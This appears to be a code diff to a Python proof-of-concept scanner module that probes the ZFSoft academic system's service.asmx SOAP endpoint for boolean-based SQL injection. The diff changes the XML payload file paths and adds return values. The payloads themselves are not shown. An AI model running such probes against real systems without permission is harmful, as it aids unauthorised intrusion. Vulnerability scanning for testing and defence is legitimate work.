@@ -24,8 +24,8 @@ class zfsoft_service_stryhm_sqli_BaseVerify:
             "SOAPAction":"http://www.zf_webservice.com/BMCheckPassword"
         }
         payload = "/service.asmx"
-        true_path = os.getcwd() + "/xml/zfsoft_service_stryhm_sqli_true.xml"
-        false_path = os.getcwd() + "/xml/zfsoft_service_stryhm_sqli_false.xml"
+        true_path = os.getcwd() + "/POCScan/xml/zfsoft_service_stryhm_sqli_true.xml"
+        false_path = os.getcwd() + "/POCScan/xml/zfsoft_service_stryhm_sqli_false.xml"
         with open(true_path, "r") as f:
             post_data_true = f.read()
         with open(false_path, "r") as f:
@@ -43,9 +43,11 @@ class zfsoft_service_stryhm_sqli_BaseVerify:
                 cprint("[+]存在正方教务系统services.asmx SQL注入漏洞...(高危)\tpayload: "+vulnurl+"..[需要对比查看xml文件内容]", "red")
             else:
                 cprint("[-]不存在zfsoft_service_stryhm_sqli漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
